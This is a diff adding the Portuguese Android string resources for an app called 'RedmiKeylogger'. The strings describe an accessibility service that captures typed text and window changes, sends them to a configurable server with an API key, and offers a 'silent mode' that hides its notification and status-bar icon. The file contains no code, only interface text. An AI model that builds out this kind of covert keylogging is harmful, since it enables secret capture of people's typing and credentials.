@@ -1,0 +1,28 @@
+<resources>
+    <string name="app_name">RedmiKeylogger</string>
+    <string name="accessibility_service_label">RedmiKeylogger – Monitor de Digitação</string>
+    <string name="accessibility_service_description">Este serviço monitora eventos de texto digitado e mudanças de janela para fins de auditoria e segurança corporativa. Os dados são enviados a um servidor local configurado pelo administrador.</string>
+    <string name="status_active">● ATIVO</string>
+    <string name="status_inactive">● INATIVO</string>
+    <string name="btn_open_accessibility">Abrir Configurações de Acessibilidade</string>
+    <string name="btn_save_config">Salvar Configuração</string>
+    <string name="label_service_status">Status do Serviço</string>
+    <string name="label_server_config">Configuração do Servidor</string>
+    <string name="hint_server_ip">IP do Servidor (ex: 192.168.1.100:5000)</string>
+    <string name="hint_api_key">API Key</string>
+    <string name="config_saved">Configuração salva com sucesso!</string>
+    <string name="config_invalid">IP inválido. Use o formato: 192.168.x.x:porta</string>
+
+    <!-- Modo Silencioso -->
+    <string name="label_silent_mode">Modo Silencioso</string>
+    <string name="label_silent_mode_desc">Oculta notificação e ícone da barra de status</string>
+    <string name="silent_mode_on">Modo Silencioso ativado</string>
+    <string name="silent_mode_off">Modo Silencioso desativado</string>
+    <string name="notif_channel_normal_name">Status do Serviço</string>
+    <string name="notif_channel_normal_desc">Exibe o status do serviço de auditoria na barra de notificações</string>
+    <string name="notif_channel_silent_name">Serviço Silencioso</string>
+    <string name="notif_channel_silent_desc">Canal silencioso sem ícone na barra de status</string>
+    <string name="notif_title">RedmiKeylogger</string>
+    <string name="notif_text">Auditoria de input ativa</string>
+    <string name="permission_notif_rationale">Permissão necessária para exibir o status do serviço na barra de notificações.</string>
+</resources>
